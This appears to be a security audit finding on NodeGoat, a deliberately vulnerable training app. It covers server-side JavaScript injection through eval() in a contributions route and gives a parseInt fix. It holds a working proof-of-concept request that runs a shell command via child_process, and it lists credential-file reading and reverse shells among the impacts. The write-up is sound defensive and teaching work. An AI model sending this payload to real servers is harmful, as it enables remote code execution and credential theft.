# NG-001 — SSJS Injection via eval() in contributions.js

**App**: NodeGoat
**CWE**: CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)
**Severity**: Critical
**File**: `app/routes/contributions.js`
**Lines**: 32–34

## Vulnerability

The `handleContributionsUpdate` handler calls `eval()` directly on three user-supplied POST body fields without any validation:

```javascript
// app/routes/contributions.js, lines 32-34
const preTax = eval(req.body.preTax);
const afterTax = eval(req.body.afterTax);
const roth = eval(req.body.roth);
```

Because NodeGoat runs server-side JavaScript, this is a full Server-Side JavaScript (SSJS) injection primitive equivalent to Remote Code Execution.

## Proof of Concept

**Request** (authenticated session required):

```http
POST /contributions HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid-session>
Content-Type: application/x-www-form-urlencoded

preTax=process.mainModule.require('child_process').execSync('id').toString()&afterTax=0&roth=0
```

**Expected response**: The server will execute `id` and the result will influence the rendered template or trigger an error that leaks the output.

## Impact

Full server-side code execution under the Node.js process user. An attacker can:
- Read arbitrary files (`/etc/passwd`, `.env`, `config/env/development.js`)
- Exfiltrate MongoDB credentials
- Spawn a reverse shell

## Remediation

Replace `eval()` with `parseInt()` or `parseFloat()`:

```javascript
const preTax = parseInt(req.body.preTax, 10);
const afterTax = parseInt(req.body.afterTax, 10);
const roth = parseInt(req.body.roth, 10);
```
